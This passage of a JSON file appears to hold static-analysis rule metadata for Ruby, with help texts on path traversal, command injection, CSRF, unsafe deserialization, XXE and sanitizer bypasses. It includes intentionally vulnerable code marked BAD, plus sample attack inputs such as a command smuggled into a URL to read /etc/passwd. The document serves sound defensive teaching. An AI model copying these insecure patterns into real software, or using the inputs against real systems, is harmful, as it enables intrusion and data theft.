      "external/cwe/cwe-359",
      "external/cwe/cwe-532"
    ],
    "filename": "19fd7075-CleartextStorage",
    "language": "ruby",
    "help": "# Clear-text storage of sensitive information\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.\n\n\n## Example\nThe following example code stores user credentials (in this case, their password) to disk in plain text:\n\n\n```ruby\nclass UserSession\n  def login(username, password)\n    # ...\n    logfile = File.open(\"login_attempts.log\")\n    logfile.puts \"login with password: #{password})\"\n  end\nend\n\n```\nInstead, the credentials should be masked or redacted before storing:\n\n\n```ruby\nclass UserSession\n  def login(username, password)\n    # ...\n    password_escaped = password.sub(/.*/, \"[redacted]\")\n    logfile = File.open(\"login_attempts.log\")\n    logfile.puts \"login with password: #{password_escaped})\"\n  end\nend\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "rb/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073",
      "external/cwe/cwe-099"
    ],
    "filename": "568a2252-PathInjection",
    "language": "ruby",
    "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path, either using an off-the-shelf library like `ActiveStorage::Filename#sanitized` in Rails, or by performing custom validation.\n\nIdeally, follow these rules:\n\n* Do not allow more than a single \".\" character.\n* Do not allow directory separators such as \"/\" or \"\\\\\" (depending on the file system).\n* Do not rely on simply replacing problematic sequences such as \"../\". For example, after applying this filter to \".../...//\", the resulting string would still be \"../\".\n* Use a whitelist of known good patterns.\n\n## Example\nIn the first example, a file name is read from an HTTP request and then used to access a file. However, a malicious user could enter a file name which is an absolute path, such as `\"/etc/passwd\"`.\n\nIn the second example, it appears that the user is restricted to opening a file within the `\"user\"` home directory. However, a malicious user could enter a file name containing special characters. For example, the string `\"../../etc/passwd\"` will result in the code reading the file located at `\"/home/user/../../etc/passwd\"`, which is the system's password file. This file would then be sent back to the user, giving them access to all the system's passwords.\n\n\n```ruby\nclass FilesController < ActionController::Base\n  def first_example\n    # BAD: This could read any file on the file system\n    @content = File.read params[:path]\n  end\n\n  def second_example\n    # BAD: This could still read any file on the file system\n    @content = File.read \"/home/user/#{ params[:path] }\"\n  end\nend\n\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Rails: [ActiveStorage::Filename\\#sanitized](https://api.rubyonrails.org/classes/ActiveStorage/Filename.html#method-i-sanitized).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n"
  },
  "rb/shell-command-constructed-from-input": {
    "name": "Unsafe shell command constructed from library input",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.3,
    "precision": "high",
    "id": "rb/shell-command-constructed-from-input",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088",
      "external/cwe/cwe-073"
    ],
    "filename": "1a9e74f4-UnsafeShellCommandConstruction",
    "language": "ruby",
    "help": "# Unsafe shell command constructed from library input\nDynamically constructing a shell command with inputs from exported functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.\n\n\n## Recommendation\nIf possible, avoid concatenating shell strings to APIs such as `system(..)` to avoid interpretation by the shell.\n\nInstead, provide the arguments to the shell command as separate arguments to the API, such as `system(\"echo\", arg1, arg2)`.\n\nAlternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters do not alter the shell command unexpectedly.\n\n\n## Example\nThe following example shows a dynamically constructed shell command that downloads a file from a remote URL.\n\n\n```ruby\nmodule Utils \n    def download(path)\n        system(\"wget #{path}\") # NOT OK\n    end\nend\n```\nThe shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.\n\nEven worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.\n\nTo avoid such potentially catastrophic behaviors, provide the input from exported functions as an argument that does not get interpreted by a shell:\n\n\n```ruby\nmodule Utils \n    def download(path)\n        # using an API that doesn't interpret the path as a shell command\n        system(\"wget\", path) # OK\n    end\nend\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "rb/incomplete-multi-character-sanitization": {
    "name": "Incomplete multi-character sanitization",
    "description": "A sanitizer that removes a sequence of characters may reintroduce the dangerous sequence.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/incomplete-multi-character-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-080",
      "external/cwe/cwe-116"
    ],
    "filename": "a0047167-IncompleteMultiCharacterSanitization",
    "language": "ruby",
    "help": "# Incomplete multi-character sanitization\nSanitizing untrusted input is a common technique for preventing injection attacks and other security vulnerabilities. Regular expressions are often used to perform this sanitization. However, when the regular expression matches multiple consecutive characters, replacing it just once can result in the unsafe text re-appearing in the sanitized input.\n\nAttackers can exploit this issue by crafting inputs that, when sanitized with an ineffective regular expression, still contain malicious code or content. This can lead to code execution, data exposure, or other vulnerabilities.\n\n\n## Recommendation\nTo prevent this issue, it is highly recommended to use a well-tested sanitization library whenever possible. These libraries are more likely to handle corner cases and ensure effective sanitization.\n\nIf a library is not an option, you can consider alternative strategies to fix the issue. For example, applying the regular expression replacement repeatedly until no more replacements can be performed, or rewriting the regular expression to match single characters instead of the entire unsafe text.\n\n\n## Example\nConsider the following Ruby code that aims to remove all HTML comment start and end tags:\n\n```ruby\n\nstr.gsub(/<!--|--!?>/, \"\")  \n\n```\nGiven the input string \"&lt;!&lt;!--- comment ---&gt;&gt;\", the output will be \"&lt;!-- comment --&gt;\", which still contains an HTML comment.\n\nOne possible fix for this issue is to apply the regular expression replacement repeatedly until no more replacements can be performed. This ensures that the unsafe text does not re-appear in the sanitized input, effectively removing all instances of the targeted pattern:\n\n```ruby\n\ndef remove_html_comments(input)  \n  previous = nil  \n  while input != previous  \n    previous = input  \n    input = input.gsub(/<!--|--!?>/, \"\")  \n  end  \n  input  \nend  \n\n```\n\n## Example\nAnother example is the following regular expression intended to remove script tags:\n\n```ruby\n\nstr.gsub(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/, \"\")  \n\n```\nIf the input string is \"&lt;scrip&lt;script&gt;is removed&lt;/script&gt;t&gt;alert(123)&lt;/script&gt;\", the output will be \"&lt;script&gt;alert(123)&lt;/script&gt;\", which still contains a script tag.\n\nA fix for this issue is to rewrite the regular expression to match single characters (\"&lt;\" and \"&gt;\") instead of the entire unsafe text. This simplifies the sanitization process and ensures that all potentially unsafe characters are removed:\n\n```ruby\n\ndef remove_all_html_tags(input)  \n  input.gsub(/<|>/, \"\")  \nend  \n\n```\nAnother potential fix is to use the popular `sanitize` gem. It keeps most of the safe HTML tags while removing all unsafe tags and attributes.\n\n```ruby\n\nrequire 'sanitize'\n\ndef sanitize_html(input)\n  Sanitize.fragment(input)\nend\n\n```\n\n## Example\nLastly, consider a path sanitizer using the regular expression `/\\.\\.\\//`:\n\n```ruby\n\nstr.gsub(/\\.\\.\\//, \"\")  \n\n```\nThe regular expression attempts to strip out all occurences of `/../` from `str`. This will not work as expected: for the string `/./.././`, for example, it will remove the single occurrence of `/../` in the middle, but the remainder of the string then becomes `/../`, which is another instance of the substring we were trying to remove.\n\nA possible fix for this issue is to use the `File.sanitize` function from the Ruby Facets gem. This library is specifically designed to handle path sanitization, and should handle all corner cases and ensure effective sanitization:\n\n```ruby\n\nrequire 'facets'  \n  \ndef sanitize_path(input)  \n  File.sanitize(input)  \nend  \n\n```\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Stack Overflow: [Removing all script tags from HTML with JS regular expression](https://stackoverflow.com/questions/6659351/removing-all-script-tags-from-html-with-js-regular-expression).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/csrf-protection-disabled": {
    "name": "CSRF protection weakened or disabled",
    "description": "Disabling or weakening CSRF protection may make the application vulnerable to a Cross-Site Request Forgery (CSRF) attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "high",
    "id": "rb/csrf-protection-disabled",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "da64ba1e-CSRFProtectionDisabled",
    "language": "ruby",
    "help": "# CSRF protection weakened or disabled\nCross-site request forgery (CSRF) is a type of vulnerability in which an attacker is able to force a user to carry out an action that the user did not intend.\n\nThe attacker tricks an authenticated user into submitting a request to the web application. Typically this request will result in a state change on the server, such as changing the user's password. The request can be initiated when the user visits a site controlled by the attacker. If the web application relies only on cookies for authentication, or on other credentials that are automatically included in the request, then this request will appear as legitimate to the server.\n\nA common countermeasure for CSRF is to generate a unique token to be included in the HTML sent from the server to a user. This token can be used as a hidden field to be sent back with requests to the server, where the server can then check that the token is valid and associated with the relevant user session.\n\n\n## Recommendation\nIn many web frameworks, CSRF protection is enabled by default. In these cases, using the default configuration is sufficient to guard against most CSRF attacks.\n\n\n## Example\nThe following example shows a case where CSRF protection is disabled by skipping token verification.\n\n\n```ruby\nclass UsersController < ApplicationController\n  skip_before_action :verify_authenticity_token\nend\n\n```\nVerification can be re-enabled by removing the call to `skip_before_action`.\n\nCare should be taken when using the Rails `protect_from_forgery` method to prevent CSRF. The default behaviour of this method is to null the session when an invalid CSRF token is provided. This may not be sufficient to avoid a CSRF vulnerability - for example if parts of the session are memoized. Calling `protect_from_forgery with: :exception` can help to avoid this by raising an exception on an invalid CSRF token instead.\n\n\n## References\n* Wikipedia: [Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)\n* OWASP: [Cross-site request forgery](https://owasp.org/www-community/attacks/csrf)\n* Securing Rails Applications: [Cross-Site Request Forgery (CSRF)](https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)\n* Veracode: [When Rails' protect_from_forgery Fails](https://www.veracode.com/blog/managing-appsec/when-rails-protectfromforgery-fails).\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "rb/command-line-injection": {
    "name": "Uncontrolled command line",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "rb/command-line-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "1a9e74f4-CommandInjection",
    "language": "ruby",
    "help": "# Uncontrolled command line\nCode that passes user input directly to `Kernel.system`, `Kernel.exec`, or some other library routine that executes a command, allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that takes a shell script that can be changed maliciously by a user, and passes it straight to `Kernel.system` without examining it first.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def create\n    command = params[:command]\n    system(command) # BAD\n  end\nend\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "rb/unsafe-deserialization": {
    "name": "Deserialization of user-controlled data",
    "description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "id": "rb/unsafe-deserialization",
    "tags": [
      "security",
      "external/cwe/cwe-502"
    ],
    "filename": "d63dc3a4-UnsafeDeserialization",
    "language": "ruby",
    "help": "# Deserialization of user-controlled data\nDeserializing untrusted data using any method that allows the construction of arbitrary objects is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if possible. If the architecture permits it, use serialization formats that cannot represent arbitrary objects. For libraries that support it, such as the Ruby standard library's `JSON` module, ensure that the parser is configured to disable deserialization of arbitrary objects.\n\nIf deserializing an untrusted YAML document using the `psych` gem, prefer the `safe_load` and `safe_load_file` methods over `load` and `load_file`, as the former will safely handle untrusted data. Avoid passing untrusted data to the `load_stream` method. In `psych` version 4.0.0 and above, the `load` method can safely be used.\n\nIf deserializing an untrusted XML document using the `ox` gem, do not use `parse_obj` and `load` using the non-default :object mode. Instead use the `load` method in the default mode or better explicitly set a safe mode such as :hash.\n\nTo safely deserialize [Property List](https://en.wikipedia.org/wiki/Property_list) files using the `plist` gem, ensure that you pass `marshal: false` when calling `Plist.parse_xml`.\n\n\n## Example\nThe following example calls the `Marshal.load`, `JSON.load`, `YAML.load`, `Oj.load` and `Ox.parse_obj` methods on data from an HTTP request. Since these methods are capable of deserializing to arbitrary objects, this is inherently unsafe.\n\n\n```ruby\nrequire 'json'\nrequire 'yaml'\nrequire 'oj'\n\nclass UserController < ActionController::Base\n  def marshal_example\n    data = Base64.decode64 params[:data]\n    object = Marshal.load data\n    # ...\n  end\n\n  def json_example\n    object = JSON.load params[:json]\n    # ...\n  end\n\n  def yaml_example\n    object = YAML.load params[:yaml]\n    # ...\n  end\n\n  def oj_example\n    object = Oj.load params[:json]\n    # ...\n  end\n\n  def ox_example\n    object = Ox.parse_obj params[:xml]\n    # ...\n  end\nend\n```\nUsing `JSON.parse` and `YAML.safe_load` instead, as in the following example, removes the vulnerability. Similarly, calling `Oj.load` with any mode other than `:object` is safe, as is calling `Oj.safe_load`. Note that there is no safe way to deserialize untrusted data using `Marshal`.\n\n\n```ruby\nrequire 'json'\n\nclass UserController < ActionController::Base\n  def safe_json_example\n    object = JSON.parse params[:json]\n    # ...\n  end\n\n  def safe_yaml_example\n    object = YAML.safe_load params[:yaml]\n    # ...\n  end\n\n  def safe_oj_example\n    object = Oj.load params[:yaml], { mode: :strict }\n    # or\n    object = Oj.safe_load params[:yaml]\n    # ...\n  end\nend\n```\n\n## References\n* OWASP vulnerability description: [deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* Ruby documentation: [guidance on deserializing objects safely](https://docs.ruby-lang.org/en/3.0.0/doc/security_rdoc.html).\n* Ruby documentation: [security guidance on the Marshal library](https://ruby-doc.org/core-3.0.2/Marshal.html#module-Marshal-label-Security+considerations).\n* Ruby documentation: [security guidance on JSON.load](https://ruby-doc.org/stdlib-3.0.2/libdoc/json/rdoc/JSON.html#method-i-load).\n* Ruby documentation: [security guidance on the YAML library](https://ruby-doc.org/stdlib-3.0.2/libdoc/yaml/rdoc/YAML.html#module-YAML-label-Security).\n* You can read that how unsafe yaml load methods can lead to code executions: [Universal Deserialisation Gadget for Ruby 2.x-3.x ](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "rb/xxe": {
    "name": "XML external entity expansion",
    "description": "Parsing user input as an XML document with external entity expansion is vulnerable to XXE attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "rb/xxe",
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-776",
      "external/cwe/cwe-827"
    ],
    "filename": "c4e45939-Xxe",
    "language": "ruby",
    "help": "# XML external entity expansion\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as `rexml`, `nokogiri` and `libxml-ruby`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\n\n## Example\nThe following example uses the `nokogiri` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set:\n\n\n```ruby\nrequire \"nokogiri\"\n\ndef process_data1\n   xmlSrc = request.body\n   doc = Nokogiri::XML.parse(xmlSrc, nil, nil, Nokogiri::XML::ParseOptions::NOENT) # BAD\nend\n\ndef process_data2\n   xmlSrc = request.body\n   doc = Nokogiri::XML.parse(xmlSrc) { |config| config.noent } # BAD\nend\n\n\n```\nTo guard against XXE attacks, the `noent` option should be omitted or cleared (e.g. using `nonoent`). This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions.\n\n\n```ruby\nrequire \"nokogiri\"\n\ndef process_data1\n   xmlSrc = request.body\n   doc = Nokogiri::XML.parse(xmlSrc) # GOOD\nend\n\ndef process_data2\n   xmlSrc = request.body\n   doc = Nokogiri::XML.parse(xmlSrc) { |config| config.nonoent } # GOOD\nend\n\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  }
}
